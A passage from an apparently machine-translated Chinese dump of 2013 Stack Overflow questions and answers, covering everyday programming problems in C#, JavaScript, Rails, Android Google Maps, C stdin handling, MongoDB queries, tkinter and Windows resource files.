fieldDependencies.GetType() == typeof<IList<FieldDependency>> 
```

TreeService 构造函数的第二个参数期望`tyepof(IList<INode>>)`

你应该能够改变你定义变量 fieldDependencies 的方式`IList<INode>`

IE

`IList<INode> fieldDependencies = _service.GetAllFieldDependencies()`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T06:17:24.670

尝试

```
var service = new TreeService(rootDependency, fieldDependencies.Cast<INode>().ToList()); 
```

从类 A 派生类 B 并不能保证您能够将具有类型参数 B 的对象泛型集合类型转换为具有类型参数 A 的泛型集合类型。

[您可以在此处](http://msdn.microsoft.com/en-us/library/dd799517.aspx)和[此处](http://blogs.msdn.com/b/csharpfaq/archive/2010/02/16/covariance-and-contravariance-faq.aspx)阅读有关逆变的更多信息。

# javascript - javascript：等待使用 setInterval 的函数的结果

> ID：15738415
> 
> 赞同：0
> 
> 时间：2013-04-01T06:00:50.533
> 
> 标签：javascript

我想要的是：

调用一个函数 check_and_wait() 来测试一个条件是真还是假。它将在指定的时间内以设定的间隔保持检查/循环。

程序的其余部分必须等待该测试的结果。这是出错的部分。它不必使用 setInterval，这就是它现在的实现方式。

```
function test_condition(){
    // do some test. return true or false
}

function check_and_wait(){
    var maxtime = 3000;
    var  start = new Date().getTime();
    condition = false;
    var interval = setInterval(function() {
        if(condition){return true;}
        else{
            if(  new Date().getTime() - start < maxtime ){
               condition = test_condition();
            }
            else{return false;}
        }
    }, 250); 

}

result = check_and_wait();
if(result){
    //do something
}
else{
     //do something else
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:06:47.520

使用回调怎么样，使用异步事件要容易得多：

```
function check(finishCallback, waitingCallback) {
    var maxtime = 3000;
    var start = new Date().getTime();
    condition = false;
    var interval = setInterval(function() {
        if (condition) { 
            finishCallback(); 
        }
        else {
            if (new Date().getTime() - start < maxtime ) {
                condition = test_condition();
            } else {
                waitingCallback(); 
            }
        }
    }, 250); 
} 
```

进而：

```
check(function() {
    //do something
}, function() {
    //do something else
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:06:04.463

您可以使用回调将在条件更改时爆发：

```
var interval;
function check_and_wait(){
    var maxtime = 3000;
    var  start = new Date().getTime();
    condition = false;
    interval = setInterval(function() {
        if(!condition)
            if(  new Date().getTime() - start < maxtime ){
               condition = test_condition();
            }
        }
        else {
           callback();
        }
    }, 250); 
}

function callback() {
     clearInterval(interval);
     // do the stuff you do when you're ready
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T06:06:25.880

当您处理异步进程时，您应该考虑使用回调函数。例如，在您的情况下，它可能是：

```
function check_and_wait(callback) {
    var maxtime = 3000;
    var  start = new Date().getTime();
    var interval = setInterval(function() {
        if (new Date().getTime() - start < maxtime ){
            if (test_condition()) {
                clearInterval(interval);
                callback();
            }
        }
    }, 250);
}

check_and_wait(function() {
    // do something
}); 
```

# ruby-on-rails - 在字段下方显示完整表单字段错误消息 - Rails 3

> ID：15738416
> 
> 赞同：3
> 
> 时间：2013-04-01T06:00:59.913
> 
> 标签：ruby-on-rails, ruby-on-rails-3

这看起来应该既简单又常见，但我一直在尝试在每个字段下方显示字段错误的完整消息版本。

我做了很多搜索，一些参考 error_messages_for 但它已被弃用。我所得到的显示了错误，但没有显示完整的消息表单......

谁能帮我理解如何在表单字段旁边显示错误消息？

```
<%= form_for @postcode, :url => search_store_locations_path, :html => {:class => "form span16"} do |f| %>
          <div class="control-group <%= "error" if @postcode.errors[:search_token].size > 0 %>">
              <%= f.label :search_token, "Suburb or Postcode", :class => "control-label" %>
              <div class="controls">
                <%= f.text_field :search_token%>
                ***<%= raw("<span class='help-inline'>") + @postcode.errors[:search_token].join(", ") + raw("</span>") if @postcode.errors[:search_token].size > 0 %>***
              </div>
          </div>
          <div class="control-group">
            <div class="controls">
                <%= button_tag "Search stores", :class => "btn btn-success" %>
            </div>
          </div>
      <% end %>
    </div> 
```

# c++ - 支持 Jenkins 和单元测试框架的 C 插件？

> ID：15738423
> 
> 赞同：5
> 
> 时间：2013-04-01T06:01:53.810
> 
> 标签：c++, c, jenkins

我想在嵌入式开发项目中使用 C 或 C++ 语言的 Jenkins。由于我是 Jenkins 的初学者，我想知道 Jenkins 的 C 和 C++ 插件是什么，它是 C 单元测试框架支持？请帮助..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T07:47:21.373

您可以使用[xUnit 插件](https://wiki.jenkins-ci.org/display/JENKINS/xUnit+Plugin)进行测试。您可以阅读这篇关于在 C[链接](http://www.van-porten.de/2009/05/cunit-tests-in-hudson/)上进行测试的文章。

# ios - iOS模拟器大量使用硬盘存储

> ID：15738429
> 
> 赞同：2
> 
> 时间：2013-04-01T06:02:12.240
> 
> 标签：ios, simulator

当我使用iOS模拟器时，剩余硬盘容量减少了很多。我试图通过仪器检查根本原因，但我找不到任何东西。有没有人有同样的问题？

# asp.net-mvc - int[] 数组包含 linq 查询中的定义抛出错误

> ID：15738435
> 
> 赞同：0
> 
> 时间：2013-04-01T06:02:44.903
> 
> 标签：asp.net-mvc, linq

```
var query = _db.Mst_Users
            .Where(item => item.CustomerUserId == customerUserId)
            .Traverse(item => _db.Mst_Users.Where(parent => item.CustomerUserId == parent.ParentId))
            .Select(item =>Convert.ToString(item.CustomerUserId)).ToArray(); 
```

在上面的查询中，我得到`customerUserId`了一个数组中的 s：

```
int[] ids = query; 
```

从上面的 int 数组：

```
var getgroup = from item in _db.Mst_Group 
               where ids.Contains(item.CustomerUserId) 
               select item; 
```

但是，它显示以下错误：

```
int[] does not contain a definition for Contains and the best extension method overload system.linq.iqueryable.contains<tsource> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:06:12.917

在第一个查询中尝试 ToList() 而不是 ToArray()。它将返回一个`List<int>`包含“包含”方法

```
List<int> ids = query; 
```

# c++ - 在 OOP 类中传递二维向量

> ID：15738436
> 
> 赞同：-4
> 
> 时间：2013-04-01T06:02:45.797
> 
> 标签：c++, oop, class, vector, 2d

我对使用 OOP 传递 2D 矢量感到困惑

例如：

```
class ABC
{
public:
    void function() 
    {
     vector<vector<string>> high;
     for ( int i=0; i<100; i++ )
     {
         high[0].push_back(i);
     }
    }
};

int main() {}; 
```

在函数中，我做了一些计算，结果存储在二维数组（高）中。我需要将整个二维数组传递给主函数，我该怎么做？

我试过这个，

```
class ABC{
public:
    vector<vector<string>> function ()
    {
    vector<vector<string>> high;
    for ( int i=0; i<100; i++ )
    {
    high[0].push_back(i);
    }
    }
};
int main()
{
ABC abc;
abc.function();
}; 
```

但这似乎是一个彻底的失败。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T07:31:06.047

```
for(int i = 0; i < 100; i++)
   for(int j = 0; j < 100; j++)
    //high[i].[j]
    //high.at(i).at(j) 
```

我是这样想的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T07:43:26.537

您需要从以下函数返回数组：

```
vector<vector<string>> function ()
{
    vector<vector<string>> high;
    high.resize(1);   // <-- note this resize, because you are using high[0] 
                      //     element later
    for ( int i=0; i<100; i++ )
    {
        high[0].push_back("some data...");
    }
    return high;      // <-- note this return statement
} 
```

调用`function`from`main`以获取您的数据，如下所示：

```
vector<vector<string>> data = function(); 
```

其他但更有效的解决方案是在其中创建您的数组`main`并通过非常量引用将其传递给`function`：

```
class ABC{
public:
void function (vector<vector<string>>& high)
{
    high.resize(1);
    for ( int i=0; i<100; i++ )
    {
        high[0].push_back("some data...");
    }
}
};

int main()
{
    ABC abc;
    vector<vector<string>> high;
    abc.function(high);
}; 
```

还要确保您的向量包含您要访问的元素。例如`high[0]`访问第一个向量元素。用于`resize`更改大小。请注意，这会`push_back`自动增加大小。

# android - 带有谷歌地图的android api显示网格

> ID：15738438
> 
> 赞同：2
> 
> 时间：2013-04-01T06:02:55.483
> 
> 标签：android, google-maps

我正在创建一个使用 google maps api v2 的 android 应用程序。我相信我已经按照谷歌教程所做的一切，但我仍然只得到谷歌地图网格（没有地图）。我使用 keystore.debug 的 SHA1 创建了一个调试密钥。

以下是我的设置： Eclipse java 编译器版本 1.7 项目 java 编译器版本 1.6

应用清单：

```
<manifest ...>
    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="8" />

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="my.app.test.permission.MAPS_RECEIVE"/>
    <uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES"/> 
    <uses-feature
        android:glEsVersion="0x00020000"
        android:required="true"/>

    <application>
        <activity>
        ...
        </activity>
        <meta-data
            android:name="com.google.android.maps.v2.API_KEY"
            android:value="xxxxxxxxxxxxxxxxxxxxxxxxxx"/>

        <uses-library android:name="com.google.android.maps"/>
    </application>

</manifest> 
```

地图xml：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@color/BackGroundColor"
    android:orientation="vertical"
    tools:context=".test" >

     <LinearLayout
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:paddingRight="10dp"
        android:paddingTop="5dp" >

        <com.google.android.maps.MapView
            xmlns:android="http://schemas.android.com/apk/res/android"
            android:id="@+id/mapview"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:clickable="true"
            android:apiKey="xxxxxxxxxxxxxxxxxxxxxxxxxx" >
        </com.google.android.maps.MapView>

    </LinearLayout>
</LinearLayout> 
```

地图活动：

```
public class Map extends MapActivity {
MapView mapView; 
MapController mc;
      GeoPoint p;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    requestWindowFeature(Window.FEATURE_NO_TITLE); 
    setContentView(R.layout.activity_map);

    mapView = (MapView) findViewById(R.id.mapview); 
                mapView.setBuiltInZoomControls(true); 
                mapView.setStreetView(true);

                mc = mapView.getController();
                String coordinates[] = {"1.352566007", "103.78921587"};
                double lat = Double.parseDouble(coordinates[0]);
                double lng = Double.parseDouble(coordinates[1]);

                p = new GeoPoint(
                      (int) (lat * 1E6), 
                      (int) (lng * 1E6));

                mc.animateTo(p);
                mc.setZoom(17); 
                mapView.invalidate();
}

      @Override
      protected boolean isRouteDisplayed() { return false; } 
```

}

我知道有很多帖子有同样的问题。我都读完了！！！我已经创建了几次密钥，但仍然相同......有什么想法有什么问题，我只看到网格？该应用程序对 AVD 以及具有 android 版本 2.2.1 的三星手机具有相同的结果

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T08:05:42.453

如果您为 API V2 编写应用程序，那么您使用了错误的对象，您需要修复一些事情：

**1.**删​​除这个：

```
<uses-library android:name="com.google.android.maps"/> 
```

这是 Google Map API V1 的许可。

**2.**你必须添加这2个权限：

```
<permission android:name="your.application.package.permission.MAPS_RECEIVE"    android:protectionLevel="signature"/>
<uses-permission android:name="your.application.package.permission.MAPS_RECEIVE"/> 
```

更改：更改`your.application.package`为您当前的应用程序包。

**3.**当您定位`SDK v8`时，您必须为您的应用程序添加片段支持才能使用`SupportMapFragment`来自 Google Map API V2，因此您需要添加`google-support-v4`和更改您的地图对象`SupportMapFragment`。

**4.**你`MapActivity`的必须改成`FragmentActivity`。

**5.**您可以在我写的关于如何将 Google Map API V2 添加到您的项目的博客文章中获得有关如何进行这些更改的更多信息：

[谷歌地图 API V2](http://blog-emildesign.rhcloud.com/?p=435)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T05:29:22.547

您的问题与模拟器有关，您需要安装到APK。我有类似的问题，所以我准备了一步一步的教程来展示如何在模拟器（android 4.2.2）上使用谷歌地图 android v2 看看我的博客：[http ://umut.tekguc.info/en/content /google-android-map-v2-step-step](http://umut.tekguc.info/en/content/google-android-map-v2-step-step)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:34:26.907

您需要从 java keytool 而不是 SHA1 生成 MD5 指纹。查看这篇文章以生成 MD5 指纹： [如何从 Java 的 keytool 获取 MD5 指纹，而不仅仅是 SHA-1？](https://stackoverflow.com/questions/6305938/how-can-i-get-the-md5-fingerprint-from-javas-keytool-not-only-sha-1)

# android - 像 PENDULUM 一样旋转布局

> ID：15738442
> 
> 赞同：2
> 
> 时间：2013-04-01T06:03:20.123
> 
> 标签：android, android-layout, animation

我可以像 PENDULUM 一样移动膨胀的布局或对话框或（另一种方式）等。膨胀的布局包含一些图像视图和文本视图。是否可以通过动画

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:15:36.837

您可以使用[RotateAnimation](http://developer.android.com/reference/android/view/animation/RotateAnimation.html)并将其分配给您的父视图。

但是，要获得摆动效果（如钟摆），您需要为枢轴和度数提供适当的值。

```
<rotate xmlns:android="http://schemas.android.com/apk/res/android"
android:pivotX="50%" android:pivotY="50%" android:fromDegrees="-135"
android:toDegrees="-45" android:drawable="@drawable/imagefile_to_rotate"
android:repeatCount="infinite" /> 
```

在您的情况下，您需要一个可绘制的图层列表来将图像与文本结合起来。看到这个。 [http://developer.android.com/guide/topics/resources/drawable-resource.html#LayerList](http://developer.android.com/guide/topics/resources/drawable-resource.html#LayerList)

但是，您可以在 LayerList 中使用 Drawable 而不是 View。所以问题是你不能使用视图，但必须创建一个自定义的 Drawable。

# c - 在 scanf 之后使用 read 系统调用

> ID：15738446
> 
> 赞同：2
> 
> 时间：2013-04-01T06:04:22.753
> 
> 标签：c, scanf

我对以下代码感到困惑，

```
#include<stdio.h>

int main()
{
 char buf[100]={'\0'};
 int data=0;
 scanf("%d",&data);
 read(stdin,buf,4);         //attaching to stdin
 printf("buffer is %s\n",buf);

 return 1;
 } 
```

假设在运行时我提供了输入`10abcd`，因此根据我的理解应该发生以下情况：

1.  scanf 应该放在`10`数据中
2.  并且`abcd`仍然在标准输入缓冲区
3.  当 read 尝试读取标准输入（已经`abcd`存在）时，它应该`abcd`将`buf`
4.  所以 printf 应该打印`abcd`

但它没有发生，printf 没有显示 o/p

我在这里错过了什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T06:09:56.693

首先`read (stdin, ...)`应该给出警告（如果您启用了它们），您应该明智地注意。 `read()`将整数作为第一个参数，指定要从哪个通道读取。 `stdin`是类型`FILE *`。

即使您将其更改为`read(0,...`，也不建议这样做。 `scanf`正在读取从`FILE *stdin`文件句柄 0 缓冲的文件。 `read (0, ...)`直接从底层文件句柄读取并忽略任何缓冲的字符。这将导致奇怪的结果，除非`stdin`设置为无缓冲。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-01T06:23:03.990

忽略与函数调用语法相关的机械问题`read()`，有两种情况需要考虑：

1.  输入来自终端。
2.  输入来自文件。

### 终端

在用户点击返回之前，没有数据可供读取。此时，标准 I/O 库会将所有可用数据读入与之关联的缓冲区`stdin`（即“10abcd\n”）。然后它将解析数字，将`a`缓冲区中的数字留给其他标准 I/O 函数稍后读取。

当`read()`发生这种情况时，它也会等待用户提供一些输入。它不知道`stdin`缓冲区中的数据。它将挂起，直到用户点击返回，然后将读取下一批数据，在缓冲区中返回最多 4 个字节（除非碰巧第四个字符是 ASCII NUL ，否则不会出现空终止`'\0'`）。

### 文件

实际上，这并没有太大的不同，除了不是将一行数据读入缓冲区，标准 I/O 库可能会读满整个缓冲区（`BUFSIZ`字节，可能是 512 或更大）。然后它将转换`10`并留下`a`供以后使用。（如果文件短于缓冲区大小，则将全部读入`stdin`缓冲区。）

然后`read`将从文件中收集接下来的 4 个字节。如果整个文件已经被读取，那么它将什么都不返回——读取了 0 个字节。

* * *

您需要记录并检查`read()`. 您还应该检查返回值，`scanf()`以确保它确实读取了一个数字。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T06:14:51.680

试试……`man read`先。

read 被声明为 ssize_t read(int fd, void *buf, size_t count);

并且标准输入被声明为 FILE *。这就是问题所在。使用 fread() 代替，您将被排序。

```
int main()
{
 char buf[100]={'\0'};
 int data=0;
 scanf("%d",&data);

 fread(buf, 1, 4, stdin);
 printf("buffer is %s\n",buf);

 return 1;
} 
```

**编辑：**您的理解几乎是正确的，但并不完全正确。为了正确解决您的问题，我同意 Jonathen Laffer 的观点。

你的代码是如何工作的，

1) scanf 应在数据中放置 10。

2) 当您按下 ENTER 时，abcd 仍将位于标准输入缓冲区中。

3) 然后 read() 将再次等待输入，您必须再次按 ENTER 才能进一步运行程序。

4）现在，如果您在第二次按 ENTER 之前输入了任何内容， printf 应该打印它，否则除了您的 printf 语句之外，您将不会得到任何输出。

这就是为什么我让你用 fread 代替。希望能帮助到你。

# javascript - 动态重新加载一行

> ID：15738451
> 
> 赞同：0
> 
> 时间：2013-04-01T06:05:15.420
> 
> 标签：javascript, html, jquery

我正在用 java + spring 3.0 + Tiles 开发 ERP 项目

我正在动态编辑表格的记录（即行）。

编辑后我想刷新该行（不刷新整个页面）以显示编辑结果....

那么如何动态重新加载表格的一行？？？

下面是我的ajax函数

```
$.ajax({
    url: EditTaskSubmiturl,
    type: "GET",
    data: {
        id:taskid,
        title:title,
        description:description,
        milestone:milestone,
        assignedTo:assignedTo,
        deadline:deadline,
        priority:priority
    },
    success: function(data) {
        alert("Hellloo");
        alert(data);

        // for reloading the row I'm using the below line, but it's not working.
        imgval.parent('td').parent('tr').reload();
    }
}); 
```

请帮我.....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:10:47.033

给表或行一个唯一的 id，例如`my-table`，然后使用 jQuery 的[`load`](http://api.jquery.com/load/)：

```
$('#my-table').load(window.location.href + ' #my-table'); 
```

**[编辑]**不知道`data`你的例子是什么，很难说要做什么。您可以使用 jQuery 的[`replaceWith`](http://api.jquery.com/replaceWith/). 您可以只针对要更改和使用的内容[`html`](http://api.jquery.com/html/)

# eclipse - Eclipse Helios 似乎已损坏

> ID：15738457
> 
> 赞同：0
> 
> 时间：2013-04-01T06:05:33.873
> 
> 标签：eclipse

我正在 Eclipse Helios 中开发一个应用程序，从昨天开始，在运行该应用程序时，并没有应用代码中的每一个更改。我不知道发生了什么。我的 Eclipse 是否已损坏？有没有人遇到过这样的情况？很多谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T12:18:04.403

您可能禁用了自动构建，因此 Eclipse 永远不会编译您的更改。检查主菜单项目 -> 自动构建。

# mysql - 如何使用 vb.net 将列表框中的所有项目保存到 MYSQL 数据库

> ID：15738459
> 
> 赞同：0
> 
> 时间：2013-04-01T06:05:45.057
> 
> 标签：mysql, vb.net, listboxitem

这是我的代码，我只能保存第一项。我需要将整个列表保存在一个数据库列中。提前感谢您的帮助。

```
Dim mysql As String = "UPDATE tbl_item SET my_item = (@myitems) WHERE id = '" & Label6.Text & "'"

Dim mycmd As New MySqlCommand(mysql, sConnection)

Dim values As New List(Of String)

values.Add(ListBox1.Items.Add(values))

Dim sqlParam As New MySqlParameter With {.ParameterName = "@myitems", .DbType = DbType.String}

mycmd.Parameters.Add(sqlParam)

Dim i As Integer

For i = 0 To values.Count - 1
    sqlParam.Value = (ListBox1.Items(i) & ";")
    mycmd.ExecuteNonQuery()
Next 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:28:31.900

```
Dim i As Integer

For i = 0 To values.Count - 1
         If sqlparam.value = "" Then
            sqlparam.value = listbox1.Items(i) & ";"
        Else
            sqlparam.value = sqlparam.value & listbox.Items(i) & ";"
        End If

    Next       
   mycmd.ExecuteNonQuery() 
```

如果此代码失败，则尝试将 mycmd.execute.... 放入..

# mongodb - 查询嵌入集合 MongoDB 强加条件（AND & OR）

> ID：15738471
> 
> 赞同：0
> 
> 时间：2013-04-01T06:06:35.663
> 
> 标签：mongodb, conditional-operator

我正在尝试查询嵌入式集合并达到以下条件：

`A && C || B && C || A && D || B && D`

根据我对几个教程的理解，查询应该是这样的：

为了，

case1 OR ( [case2 AND case3] OR [case4 AND case5] )

询问：

{ case1 ,[{case2,case3},{case4,case5}] }

我尝试了以下查询，但似乎无法正常工作。请帮忙。

```
db.hg19_refgene_47.find({ 

                "_id.c" : 1, 
            [   {
                "_id.p" : {"$gte" : 96978}, 
                "_id.ep" : {"$lte" : 103632}
                },
                {
                "_id.p" : {"$gte" : 96978}, 
                "_id.ep" : {"$lte" : 103632}
                },
                {
                "_id.p" : {"$gte" : 96978}, 
                "_id.ep" : {"$lte" : 103632}
                }
            ]   

        }) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T07:44:44.197

您可以尝试使用`$or`运算符：

```
db.hg19_refgene_47.find({
  $or: [
    "_id.c" : 1,
    {
      "_id.p" : {"$gte" : 96978}, 
      "_id.ep" : {"$lte" : 103632}
    },
    {
      "_id.p" : {"$gte" : 96978}, 
      "_id.ep" : {"$lte" : 103632}
    },
    {
      "_id.p" : {"$gte" : 96978}, 
      "_id.ep" : {"$lte" : 103632}
    }
  ]
}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T10:45:54.837

使用与 SQL OR 条件相同的 OR 运算符。当您想要子文档始终使用 elemMatch 运算符的 AND 条件时要记住一件重要的事情，否则您的查询将无法按预期工作

# python - 通过当前的类麻烦

> ID：15738480
> 
> 赞同：0
> 
> 时间：2013-04-01T06:07:30.657
> 
> 标签：python, class, inheritance, parameter-passing

我以为我知道python的基础知识，但是这个问题似乎证明了这一点是错误的。

问题是，当我将一个类传递给一个函数时，该函数将无法识别我传递的类，而只会识别该父类。

这是课堂。

```
from tkinter import *

from one_sample_t_test_dialog import One_T_Test_Dialog
from about_us_dialog import About_Us_Dialog

class Gui(Frame):
    def __init__(self, master):
        Frame.__init__(self, master, background="white")
        self._master = master
        # Main Window
        frame = Frame(master, width = 800, height = 600)
        self._master.title("Statistics Program")        

        # Menus
        menu = Menu(master)
        master.config(menu=menu)
        # --Tests
        test_menu = Menu(menu)
        menu.add_cascade(label = "Tests", menu = test_menu)
        # ----T-Tests
        t_test_menu = Menu(test_menu)
        test_menu.add_cascade(label = "T-Tests", menu = t_test_menu)
        t_test_menu.add_command(label="One Sample t-test", command = self.one_sample_t_test)
        t_test_menu.add_command(label="Two Sample t-test", command = self.two_sample_t_test)
        t_test_menu.add_command(label="Paired t-test", command = self.about_us)
        # --Help
        help_menu = Menu(menu)
        menu.add_cascade(label = "Help", menu = help_menu)
        help_menu.add_command(label="About Us", command = self.about_us)

        # Toolbar
        # --t-test
        toolbar = Frame(master)
        l = Label(toolbar, text="Mean Comparison:")
        l.pack(side=LEFT, padx = 5, pady = 5)
        b=Button(toolbar, text = "One Sample t-test", command=self.one_sample_t_test)
        b.pack(side=LEFT)
        b=Button(toolbar, text = "Two Sample t-test", command=self.two_sample_t_test)
        b.pack(side=LEFT)
        b=Button(toolbar, text = "Paired t-test", command=self.two_sample_t_test)
        b.pack(side=LEFT)
        # --anova
        l=Label(toolbar, text="ANOVA:")
        l.pack(side=LEFT, padx = 5, pady = 5)
        b=Button(toolbar, text = "One Way Anova", command=self.two_sample_t_test)
        b.pack(side=LEFT)
        # --Multiple-comparison Tests
        toolbar_02 = Frame(master)
        l=Label(toolbar_02, text="Multiple Mean Comparison:")
        l.pack(side=LEFT, padx = 5, pady = 5)
        b=Button(toolbar_02, text = "Tukey", command=self.two_sample_t_test)
        b.pack(side=LEFT)
        b=Button(toolbar_02, text = "Bonferroni", command=self.two_sample_t_test)
        b.pack(side=LEFT)

        toolbar.pack(fill=BOTH)
        toolbar_02.pack(fill=BOTH)

        # Spreadsheet.
        self.canvas = canvas =  Canvas(self._master)
        self.canvas_frame = canvas_frame = Frame(canvas)
        # Scrollbars
        vbar=Scrollbar(self._master,orient=VERTICAL, command=self.canvas.yview)
        hbar=Scrollbar(self._master,orient=HORIZONTAL, command=self.canvas.xview)
        # Further configuration
        canvas.configure(yscrollcommand=vbar.set, xscrollcommand=hbar.set)
        # Initialize scrollbars
        vbar.pack(side=RIGHT,fill=Y)
        hbar.pack(side=BOTTOM,fill=X)
        canvas.pack(side=LEFT, expand=True, fill="both")
        canvas.create_window((4,4), window=canvas_frame, anchor="nw")
        canvas_frame.bind("<Configure>", self.OnFrameConfigure)
        self.grid()
        #canvas_frame.pack()

        self._master.geometry("800x600+50+50")
        #self.pack(fill=BOTH, expand=1)

    def get_master(self):
        return self._master

    def OnFrameConfigure(self, event):
        '''Reset the scroll region to encompass the inner frame'''
        self.canvas.configure(scrollregion=self.canvas.bbox("all"))

    def about_us(self):
        d = About_Us_Dialog(self._master)
        root.wait_window(d.parent)

    def grid(self):
        """
        Make the grid here.
        """
        grid_frame = self.canvas_frame
        self.entry = []
        for i in range(40):
            self.entry.append([])

        for i in range(len(self.entry)):
            for j in range(80):
                self.entry[i].append(Entry(grid_frame, width=10))
                self.entry[i][j].grid(row=j, column=i)

        # grid_frame.pack(padx=2, pady=2)

    def one_sample_t_test(self):        
        d = One_T_Test_Dialog(self)
        value = self._master.wait_window(d.parent)

        # Check if an error occured.
        result = None # We will store the result here.
        if value is None:
            return
        else:
            # perform the t-test here.
            pass

        # If we made it at this point, there's no error and 
        # the result have been acquired. We can now display
        # the result.

    def two_sample_t_test(self):
        # Testing Ground
        #print(self.get_variables())
        #print(self.get_values(3))
        pass

    def get_variables(self):
        """
        This method will return a dictionary of variable names and their corresponding
        index, that is located in index zero of the double array. For instance, 
        self.entry[3][0] is a variable name, so is self.entry[5][0], and so on.
        """
        variable_name_dict = {}
        for i in range(len(self.entry)):
            temp = self.entry[i][0].get()
            if temp is not "":
                variable_name_dict[i] = temp

        return variable_name_dict

    def get_values(self, variable_index):
        """
        This method will return a list of values that is located under the variable.
        Use this in conjunction with get_variables().
        """
        values = []
        if self.entry[variable_index][0] is not "": # Make sure that it's not empty.
            for v in self.entry[variable_index]:
                if v.get() is not "":
                    values.append(v.get())
        # Since the first cell is in the column is always a variable name, we can 
        # pop the first element.
        values.pop(0)
        return values

root = Tk()
app = Gui(root)
root.mainloop() 
```

这是另一个类，上面的类调用了一个方法。上面的类将自己作为参数传递。

```
from tkinter import *
from tkinter import messagebox

import dialog 

class One_T_Test_Dialog(dialog.Dialog):
    def body(self, gui):
        master = gui.get_master()
        # Entry Labels.
        Label(master, text="Mean:").grid(row=0)
        Label(master, text="Standard Deviation:").grid(row=1)
        Label(master, text="Sample Size:").grid(row=2)
        Label(master, text="Sample Size:").grid(row=3)
        Label(master, text="Test Value:").grid(row=4)

        # Data entry class members.
        # The for loop initialize the list as an entry list.
        num_of_entry = 5
        self.entry = [] #entry list
        for i in range(num_of_entry):
            self.entry.append(Entry(master))

        # Data entry location initialization.
        for i in range(num_of_entry):
            self.entry[i].grid(row=i,column=1)

        # Or, the user can just select a mean from the drop down list and
        # enteryt the test value.
        Label(master, text="Select Values Instead:").grid(column = 0, row=5)
        self.dropdown_val = StringVar(master)
        # initial value
        self.dropdown_val.set('Select a values.')
        choices = ['red', 'green', 'blue', 'yellow','white', 'magenta']
        option = OptionMenu(master, self.dropdown_val, *choices).grid(column = 1, row=5)
        button = Button(master, text="check value slected").grid(column=1, row=6)

        # Further initialization.
        # --At the Test Value, or null hypothesis, we want to have a default
        # value. Assuming this is a 151/252 level course, the default value
        # is always 0.
        self.entry[4].insert(0, "0")

        return self.entry[0] # initial focus

    def apply(self):
        # Collect the data first.
        data_list = []
        for e in self.entry:
            data_list.append(e.get())

        # Validate
        for d in data_list:
            # Make sure it's not empty.
            # Make sure the value is float.
            empty_flag = False
            not_float_flag = False

            if len(d) == 0:
                empty_flag = True

            if empty_flag is False:
                try:
                    float(d)
                except ValueError:
                    not_float_flag = True

            if empty_flag is True or not_float_flag is True:
                # Report an input error.
                if empty_flag is True and not_float_flag is False:
                    messagebox.showerror("INPUT ERROR", "There's an empty input box.")
                elif not_float_flag is True and empty_flag is False:
                    messagebox.showerror("INPUT ERROR", "Check your input. Make sure its a number.")
                elif not_float_flag is True and empty_flag is True:
                    messagebox.showerror("INPUT ERROR", "There's an empty input box and non-numerical input.")
                return None

        # If everything went well, convert the validated data.
        for i in range(len(data_list)):
            data_list[i] = float(data_list[i])

        return data_list 
```

问题是第二个类中的行 master = gui.get_master() 给出错误，因为 AttributeError: 'Frame' object has no attribute 'get_master' Frame 是类 Gui 的父级。

# c - 用于确定项目或 exe 名称的 c 预处理器

> ID：15738481
> 
> 赞同：1
> 
> 时间：2013-04-01T06:07:31.087
> 
> 标签：c, c-preprocessor

我有一个名为 resources.rc 的 C 资源文件，其中包含以下行来指定用于项目的图标

```
 1000 ICON  "icon222.ico" 
```

我想将这个相同的资源文件用于多个项目，根据项目使用预处理器条件..

例如

```
 #if __PROJECT__ == "myapp.exe"
    1000 ICON "icon222.ico"
    #endif

    #if __PROJECT__ == "myotherapp.exe"
    1000 ICON "icon777.ico"
    #endif 
```

是否有标准的 C 宏或定义可用于实现这样的目标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T09:30:48.970

据我所知，没有预定义的宏来承载 VC 设置的项目特定值。

因此，只需选择一个您自己喜欢的`MYPROJECTNAME`并且`#define`在您的每个项目中都不同，然后在您的 rc 文件中进行测试，就像您发布的那样。

我不确定 VC 是否自动在 rc 文件上使用预处理器，或者您是否需要在 VC 的构建过程中应用一些 mod 来让它执行此操作。

* * *

**更新**：

